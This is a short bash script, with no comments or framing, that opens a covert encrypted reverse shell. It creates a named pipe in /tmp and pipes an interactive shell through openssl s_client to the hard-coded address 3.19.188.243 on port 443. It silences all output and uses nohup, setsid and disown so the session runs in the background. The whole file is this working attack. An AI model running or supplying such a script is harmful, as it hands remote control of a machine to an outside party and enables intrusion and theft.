#!/bin/bash

rm /tmp/s > /dev/null 2>&1
mkfifo /tmp/s > /dev/null 2>&1 
nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 3.19.188.243:443 > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &
disown $!
